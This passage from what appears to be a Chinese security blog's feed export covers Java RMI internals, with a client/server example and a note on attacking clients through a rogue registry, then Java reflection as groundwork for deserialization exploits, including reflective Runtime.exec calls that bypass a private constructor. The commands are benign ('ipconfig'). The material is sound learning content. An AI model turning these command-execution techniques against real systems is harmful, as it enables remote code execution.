<li><p>假设客户端找到了想要的资源，但<strong>数据传输又成了问题</strong>。这时候获取到的是一个完整的对象，在远程调用的时候，如果先把对象分解成基本类型的数据传输给客户端后，再把这些基本类型的数据拼接成对象，这样会大大增加代码复杂度。</p>
</li>
<li><p>另外，如果程序需要频繁的远程调用，开发人员不可能为每一次调用都设计一套调用方法，所以<strong>一个统一而规范的接口十分重要</strong>。</p>
</li>
</ul>
<h1 id="RMI工作流程"><a href="#RMI工作流程" class="headerlink" title="RMI工作流程"></a>RMI工作流程</h1><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B/image-20210725210630532.png" alt="image-20210725210630532"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/640" alt="Image"></p>
<p>上面这个流程图说的很清楚。</p>
<p><strong>RMI有三个角色参与</strong>，分别是<code>Client、Registry、Server</code>。<code>Server</code>向<code>Client</code>提供服务，但它不愿意将所有的对象、方法都交给<code>Client</code>去调用，所以它需要一个“中间人” - <code>Registry</code>，<code>Server</code>把它想要提供的服务告诉<code>Registry</code>，让<code>Registry</code>和<code>Client</code>去交流（获取、发送请求），所以它相当于是服务器的代理，负责帮<code>Server</code>办事。</p>
<p>那么<code>Registry</code>怎么向<code>Client</code>提供服务呢？<code>Registry</code>上会绑定需要提供给客户端的<strong>服务</strong>，绑定的时候，会生成<strong>对应</strong>的<code>stub（存根）</code>，所以<code>Registry</code>里有各种服务的<code>stub</code>。这时候<code>Client</code>如果想要获取服务器上的某个<strong>服务</strong>，它可以直接在<code>Registry</code>中查找，如果找到了对应的<code>stub</code>，就返回这个<code>stub</code>的拷贝，这样他就可以直接把<code>stub</code>当作一个<code>object</code>，然后调用里面的方法了。所以，<code>stub</code>相当于<strong>远程对象在客户端的代理。</strong></p>
<p>Registry除了会生成<code>stub</code>,还会生成<code>skeleton</code>（相当于<code>server</code>的代理），<code>Skeleton</code>用于处理<code>stub</code>发过来的请求，然后去调用服务端的方法，再返回给<code>stub</code>。但在<strong>jdk1.2</strong>以后，反射API替代了<code>skeleton</code>的作用，它可以直接把请求发给服务端，所以就不再用<code>skeleton</code>了。</p>
<p>客户端调用<code>stub</code>的方法后，<code>stub</code>会将客户端想要调用的方法名及其参数<strong>序列化</strong>，利用<strong>远程引用层</strong>和<strong>传输层</strong>（<strong>Socket通信</strong>）发给<code>Server</code>，<code>Server</code>那边的<strong>远程引用层</strong>接收到数据后发给<code>Skeleton</code>，<strong>反序列化</strong>后在<code>Server</code>执行被调用的方法，然后将方法的返回值或异常打包（序列化后）返回给客户端，客户端再以同样的方法<strong>反序列化</strong>解析返回数据。</p>
<p>这里需要注意的是，远程方法的调用最后都是在<strong>Server</strong>执行的，最后只是返回序列化后的结果而已。</p>
<h1 id="案例讲解"><a href="#案例讲解" class="headerlink" title="案例讲解"></a>案例讲解</h1><h2 id="定义远程接口"><a href="#定义远程接口" class="headerlink" title="定义远程接口"></a>定义远程接口</h2><p><code>Server</code>想要提供服务，那么就需要为这些提供的服务定义一个接口，让<code>Client</code>可以访问到它。该接口必须继承<code>Remote</code>，这样该接口才能成为一个远程对象，才可以被JAVA虚拟机所调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个接口不仅要给server用，还要给client用，client中通常是把服务端接口打包成jar包使用。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloService</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="comment">//继承Remote接口以后，该Class成为Server的一个远程对象，供Client访问并提供一定服务</span></span><br><span class="line">    <span class="comment">//Remote只是一个标识接口，不含任何方法，继承该接口的类可以被远程的JAVA虚拟机调用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//因为远程调用会涉及到网络通信，容易出现网络异常，所以需要抛出RemoteException</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;<span class="comment">//事实上，RemoteException也是继承于IOException的</span></span><br><span class="line">    <span class="comment">//修饰符必须为public 否则会报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="定义Service-Implementation-Class"><a href="#定义Service-Implementation-Class" class="headerlink" title="定义Service Implementation Class"></a>定义Service Implementation Class</h2><p>定义好了远程接口后，需要写出具体的方法内容即实现类。该类需要继承<code>UnicastRemoteObject</code>，而这个父类会生成<code>stub</code>和<code>skeleton</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="comment">//用来调用远程接口， 这样客户端访问远程对象的时候，远程对才会把自身的一个拷贝(stub存根)以socket的形式传输给客户端</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//UnicastRemoteObject 将生成stub（远程对象在本地的代理）和skeleton（服务端的一个代理，用来处理stub发来的请求）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceImp</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloServiceImp</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line"> <span class="comment">//如果父类的无参构造函数抛出了异常，则子类的无参构造函数不能省略不写，并且必须抛出父类的异常或父类异常的父类</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;这是远程服务器发来的消息&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Registry-Class"><a href="#Registry-Class" class="headerlink" title="Registry Class"></a>Registry Class</h2><p>写好了服务接口，那么我们就需要一个中间代理人 - Registry。</p>
<p>我们需要创建并启动RMIService，并把我们提供的实现类绑定在上面。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> server.HelloService;</span><br><span class="line"><span class="keyword">import</span> server.HelloServiceImp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中间代理人</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIRegister</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloServiceImp</span>();<span class="comment">//imp会自动调用父类的构造方法来生成返回stub</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//在本地创建并启动RMIService，被创建的RMIService服务将会在指定的端口上监听请求。</span></span><br><span class="line">            Naming.bind(<span class="string">&quot;rmi://localhost:1099/helloService&quot;</span>, helloService);</span><br><span class="line">            <span class="comment">//执行这个方法后相当于发布了RMI服务，把远程服务的实现类绑定到指定的RMI地址上</span></span><br><span class="line">            System.out.println(<span class="string">&quot;远程对象绑定成功！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;发生重复绑定对象异常&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;发生URL协议异常&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;创建远程对象异常&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h2><p>直接使用<code>Naming.lookup()</code>可以找到我们想要的<strong>stub</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> server.HelloService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//在远程对象注册表registry中寻找指定name的对象，并返回reference</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取register</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">            <span class="keyword">for</span>(String i : registry.list())&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;注册的服务：&quot;</span>+i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> (HelloService) Naming.lookup(<span class="string">&quot;rmi://localhost:1099/helloService&quot;</span>);<span class="comment">//返回的就是stub</span></span><br><span class="line">            System.out.println(helloService.hello());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Client上的接口"><a href="#Client上的接口" class="headerlink" title="Client上的接口"></a>Client上的接口</h2><p>即使我们在服务端上设计了一套接口<code>HelloService</code>，但是Client是不知道的，所以我们需要在Client端设定一模一样的接口，这样Client才知道哪些方法能够被他们所调用。</p>
<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>先运行<code>RMIRegister</code></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B/image-20210725220714621.png" alt="image-20210725220714621"></p>
<p>可以看到，RMIService成功绑定。</p>
<p>再运行Client：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B/image-20210725220758857.png" alt="image-20210725220758857"></p>
<p>成功收到远程服务器上的方法返回值。</p>
<h1 id="RMI的安全问题"><a href="#RMI的安全问题" class="headerlink" title="RMI的安全问题"></a>RMI的安全问题</h1><h2 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h2><p>RMI在数据传输过程中，涉及到序列化和反序列化，这就有构造恶意对象的风险。</p>
<h2 id="伪造LocateRegister攻击client"><a href="#伪造LocateRegister攻击client" class="headerlink" title="伪造LocateRegister攻击client"></a>伪造LocateRegister攻击client</h2><p>我们客户端获取<strong>stub</strong>的方式是通过**Naming.lookup()**来查找指定url</p>
<p>例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*Client.java*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">HelloService</span> <span class="variable">helloService</span> <span class="operator">=</span> (HelloService) Naming.lookup(<span class="string">&quot;rmi://localhost:1099/helloService&quot;</span>);<span class="comment">//返回的就是stub</span></span><br><span class="line">System.out.println(helloService.hello());</span><br><span class="line"><span class="comment">//此处我们是通过查找RMI服务地址localhost:1099中的helloService对象</span></span><br></pre></td></tr></table></figure>

<p>如果该<strong>lookup()<strong>方法中的</strong>rmi</strong>地址(也就是LocateRegister)是可控的，让Client获取到的service是我们构造的恶意service(攻击者搭建的RMI server和实现的恶意对象)，<strong>我们就能执行恶意helloService中的hello()了</strong></p>
<p>RMI的利用方法远远不止如此，更多相关内容可见<a href="https://leihehehe.github.io/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/">Java反序列化漏洞之利用链分析集合(4)</a></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://y4er.com/post/java-rmi/">Java RMI原理及反序列化学习</a></p>
<p><a href="https://f5.pm/go-61706.html">JAVA安全基础（四）– RMI机制</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13927460.html">Java安全之RMI反序列化</a></p>
<p><a href="http://devgou.com/article/Java-RMI/">Java-RMI</a></p>
<p><a href="https://blog.csdn.net/zhouxukun123/article/details/78324750">[改善Java代码]不要在构造函数中抛出异常</a></p>
<p><a href="https://www.guildhab.top/2020/03/java-rmi-ldap-%25E6%25B5%2581%25E7%25A8%258B%25E5%2588%2586%25E6%259E%2590">Java 反序列化漏洞(1) – Java RMI 原理/流程</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之Java反射机制(1)</title>
    <url>/2021/07/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是正式开始学习Java反序列化漏洞的第一篇，而Java反射机制是熟知Java反序列化漏洞的第一步，此系列笔记是为了自己能更好理解反序列化漏洞，也希望通过学习，自己能深层了解漏洞成因、学会利用、自己编写、改编利用工具。</p>
<h1 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h1><h2 id="什么是Java反射机制"><a href="#什么是Java反射机制" class="headerlink" title="什么是Java反射机制"></a>什么是Java反射机制</h2><blockquote>
<p>Java的反射（reflection）机制是指在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。反射被视为动态语言的关键。</p>
</blockquote>
<p>通俗的来说，就是我们可以通过Java的反射机制来获取到任意一个Class、变量、method、instance等等，而我们<strong>动态</strong>地任意获取Class，正有利于我们实现反序列化漏洞的利用。</p>
<h2 id="静态语言和动态特性"><a href="#静态语言和动态特性" class="headerlink" title="静态语言和动态特性"></a>静态语言和动态特性</h2><p>简单来说，动态语言可以改变一个变量的类型 - 你不用提前定义某个变量的类型，比如<code>Python</code>和<code>PHP</code>,这些语言会在运行时自动探针你的变量类型，而你也可以在代码中随时对这些变量类型进行改变。</p>
<p>而静态语言例如<code>Java</code>,<code>C/C++</code>,<code>C#</code>就不一样，我们必须事先指定变量类型是<code>String</code>,<code>int</code>,还是<code>double</code>？</p>
<p>而在<code>Java</code>中，有一个<strong>反射机制</strong>，它可以为我们提供一些动态特性 - 即使<code>Java</code>是一门静态语言。</p>
<p>Java的反射机制可以让我们做到如下：</p>
<ul>
<li>在程序运行时，查找到一个<code>Object</code>所属的<code>Class</code></li>
<li>在程序运行时，能找到任意一个Class的<code>variable</code>和<code>method</code></li>
<li>在程序运行时，可以构造任意一个<code>Class</code>的<code>instance(Object)</code></li>
<li>在程序运行时，可以调用任何一个<code>Object</code>的方法</li>
</ul>
<span id="more"></span>

<h2 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h2><p>先来看一张图：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-1/image-20211126201028486.png" alt="image-20211126201028486"></p>
<p><strong>Class类</strong>： 保存类信息的类</p>
<p>每一个新的class在创建的时候，都会new一个新的Class类。</p>
<p>比如，我们在创建一个String类，这个String类在创建的同时，会有一个Class cls=new Class(String)被创建，专门用来保存这个String Class。</p>
<p>再举个例子，比如我们在创建一个Person类，这个Person类在创建的时候，会有一个Class cls = new Class(Person)这样的instance被创建。<strong>但Class类和这两个类并非继承关系！！</strong></p>
<p>所以，我们需要区分的是Class类是一个类，就像Person和String类一样，都是<strong>类</strong>，Person和String类在生成的时候，都会先生成Class类的instance（对象）。</p>
<p>在Class类中，我们含有各种方法函数，其中Class类的构造方法是private，Class类还拥有<code>getMethod,invoke</code>这样的方法。</p>
<p><strong>从图中可以看出：我们可以通过一个【person instance】.getClass()获取到person的Class类对象</strong></p>
<p><strong>通过【person的Class类对象】.class获取到person instance.</strong></p>
<h2 id="利用反射机制获取Class及Class静态初始化"><a href="#利用反射机制获取Class及Class静态初始化" class="headerlink" title="利用反射机制获取Class及Class静态初始化"></a>利用反射机制获取Class及Class静态初始化</h2><p>我们知道有三种方法可以获取到一个Class对象</p>
<ul>
<li><p><code>obj.getClass();</code></p>
<ul>
<li>当我们知道<strong>obj instance对象</strong>时可以使用这个方法</li>
</ul>
</li>
<li><p><code>Class.forName(&quot;Class的名字&quot;);</code></p>
</li>
<li><p><code>Class.forName( String className , Boolean initialize , ClassLoader loader );</code></p>
<ul>
<li><p>此处<code>Class.forName(&quot;Class的名字&quot;);</code>等同于<code>Class.forName( &quot;Class的名字&quot; , true , currentLoader );</code></p>
<blockquote>
<ul>
<li><code>String className</code> : 类名</li>
<li><code>Boolean initialize</code> : 是否进行类初始化</li>
<li><code>ClassLoader loader</code> : 加载器( 告诉 Java 虚拟机如何加载获取的类 , Java 默认根据类名( 即类的绝对路径 , 例如 <code>java.lang.Runtime()</code> )来加载类 )</li>
</ul>
</blockquote>
</li>
<li><p><code>Class</code>在<strong>初始化</strong>的时候，会自动执行<code>static&#123;&#125;</code>中的代码，如果我们能够控制一个<code>Class</code>，并向其中添加含有恶意代码的<strong>静态代码块</strong>，当<code>Class</code>被初始化的时候就会执行恶意代码。</p>
</li>
<li><p>当我们知道<strong>Class名字</strong>时可以使用这个方法</p>
</li>
</ul>
</li>
<li><p><code>className.class</code></p>
<ul>
<li>当我们已经<strong>加载过</strong>某个Class，可以用这个方法</li>
</ul>
</li>
</ul>
<p>其中，<code>Class.forName(&quot;Class的名字&quot;);</code>是最为常用的一种方式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; person = Class.forName(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(person);</span><br></pre></td></tr></table></figure>

<h2 id="利用反射机制获取method"><a href="#利用反射机制获取method" class="headerlink" title="利用反射机制获取method"></a>利用反射机制获取method</h2><p>我们在通过上面的代码获取到<code>class</code>后，可以获取到该<code>Class</code>的<code>method</code>。</p>
<p>需要注意的是，我们依然有两种不同的方法来获取到<code>method</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第一种方式：</span></span><br><span class="line">person.getDeclaredMethods();<span class="comment">//获取所有Method，除了继承类的方法</span></span><br><span class="line">person.getDeclaredMethod(<span class="string">&quot;methodName&quot;</span>,parameterTypes);<span class="comment">//获取指定的method</span></span><br><span class="line"><span class="comment">//第二种方式：</span></span><br><span class="line">person.getMethods();<span class="comment">//获取类方法，但不包含private属性的方法</span></span><br><span class="line">person.getMethod(<span class="string">&quot;methodName&quot;</span>,parameterTypes);<span class="comment">//获取指定名字的方法</span></span><br></pre></td></tr></table></figure>

<h2 id="构造instance"><a href="#构造instance" class="headerlink" title="构造instance"></a>构造instance</h2><p> 获取到了<code>Class</code>,我们又该如何获取到一个新的object呢？</p>
<p>假设在Person Class中，我们有三个构造函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;<span class="comment">//无参构造</span></span><br><span class="line">    System.out.println(<span class="string">&quot;NoArgConstructor&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,String age)</span>&#123;<span class="comment">//两个参数构造</span></span><br><span class="line">    System.out.println(<span class="string">&quot;TwoArgsConstructor&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,String age,<span class="type">boolean</span> flag)</span>&#123;</span><br><span class="line">    <span class="comment">//三个参数构造</span></span><br><span class="line">    System.out.println(<span class="string">&quot;ThreeArgsConstructor&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们依次获取时</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">person.newInstance();<span class="comment">//在创建新的instance时，class的constructor会被执行，而此处默认执行无参数constructor</span></span><br><span class="line">       person.getConstructor(String.class,String.class).newInstance(<span class="string">&quot;leihehe&quot;</span>,<span class="string">&quot;21&quot;</span>);<span class="comment">//此处执行两个参数的constructor</span></span><br><span class="line">       person.getConstructor(String.class,String.class,<span class="type">boolean</span>.class).newInstance(<span class="string">&quot;leiheee&quot;</span>,<span class="string">&quot;20&quot;</span>,<span class="literal">true</span>);<span class="comment">//此处执行三个参数的constructor</span></span><br></pre></td></tr></table></figure>

<p>可得如下结果</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721212917832.png" alt="image-20210721212917832"></p>
<h2 id="invoke方法"><a href="#invoke方法" class="headerlink" title="invoke方法"></a>invoke方法</h2><p>当我们构造出来了一个新的<code>instance（Object）</code>且得到需要的<code>method</code>后，我们该如何<code>call</code>这个<code>Class</code>的方法呢？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> person.newInstance();<span class="comment">//得到object</span></span><br><span class="line">person.getDeclaredMethod(<span class="string">&quot;setAge&quot;</span>, String.class).invoke(o,<span class="string">&quot;11&quot;</span>);<span class="comment">//call setAge()方法</span></span><br></pre></td></tr></table></figure>

<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="java-lang-Runtime命令执行及访问private的方法"><a href="#java-lang-Runtime命令执行及访问private的方法" class="headerlink" title="java.lang.Runtime命令执行及访问private的方法"></a>java.lang.Runtime命令执行及访问private的方法</h2><p>我们在反序列化漏洞中会遇到的<code>java.lang.Runtime</code>是执行命令的最常见的方式。</p>
<p>以下是java执行命令的语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;ipconfig&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>那如果我们要用<code>java</code>的反射机制来执行这段代码应该如何操作呢？</p>
<p>于是我写下了这段代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; runTimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//先找到Runtime这个Class的Class类</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runTimeClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);<span class="comment">//找到exec这个method</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> runTimeClass.newInstance();<span class="comment">//创建一个新的Runtime的实例</span></span><br><span class="line">exec.invoke(o1,<span class="string">&quot;ipconfig&quot;</span>);<span class="comment">//在实例中call exec()这个method</span></span><br></pre></td></tr></table></figure>

<p>但是奇怪的事情发生了：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721214436241.png" alt="image-20210721214436241"></p>
<p>代码提示19行出错 - 我们不能访问<code>private</code>属性的成员。难道是<code>constructor</code>有问题吗？</p>
<p>我们尝试进入<code>Runtime Class</code>中看一下：</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20210721214751377.png" alt="image-20210721214751377"> 果然，该构造方法是<code>private</code>的，加上前面所提到的，<code>className.newInstance()</code>是直接使用无参构造，所以我们不能直接创建这个<code>instance</code>。 </p>
<p>如何解决呢？我们有两个方法</p>
<ol>
<li><p><strong>getRuntime()</strong></p>
<p>其实之前我们就有写到执行语句是<code>Runtime.getRuntime().exec(&quot;ipconfig&quot;);</code>此处我们就没有new一个新的<code>instance</code>，反而是直接用<code>getter</code>来获取到<code>Runtime</code>。</p>
<p>所以我们在此处可以这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; runTimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//先找到Runtime这个Class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runTimeClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);<span class="comment">//找到exec这个method</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> runTimeClass.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);<span class="comment">//找到getRuntime()这个method</span></span><br><span class="line">Object o1=getRuntime.invoke(<span class="literal">null</span>);<span class="comment">//call getRuntime()来获取到Runtime实例</span></span><br><span class="line">exec.invoke(o1,<span class="string">&quot;ipconfig&quot;</span>);<span class="comment">//执行方法</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>setAccessible() - 访问private方法</strong> </p>
<p><code>Java</code>会对<code>private</code>的方法进行禁止访问的操作，而<code>setAccessible</code>可以让我们禁止或允许<code>Java</code>语言的访问检查，当我们设置<code>setAccessible(true)</code>时，我们便可以访问<code>private</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; runTimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//先找到Runtime这个Class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runTimeClass.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);<span class="comment">//找到exec这个method</span></span><br><span class="line">Constructor&lt;?&gt; declaredConstructor = runTimeClass.getDeclaredConstructor();<span class="comment">//不带参数的getConstructor是会获取到无参构造方法的，但因为Runtime的Constructor是private的，所以我们需要使用Declared</span></span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);<span class="comment">//禁止java语言访问检查，让我们可以访问这个私有的constructor</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> declaredConstructor.newInstance();<span class="comment">//通过该constructor来创建新的instance</span></span><br><span class="line">exec.invoke(o1,<span class="string">&quot;ipconfig&quot;</span>);<span class="comment">//完成命令执行</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="java-lang-ProcessBuilder命令执行"><a href="#java-lang-ProcessBuilder命令执行" class="headerlink" title="java.lang.ProcessBuilder命令执行"></a>java.lang.ProcessBuilder命令执行</h2><p>知道我们是通过<code>exec()</code>执行代码后，我们接下来想要弄清楚，<code>exec()</code>是怎么工作的。在尝试跟随exec()方法后，我们最终来到了如下地方：</p>
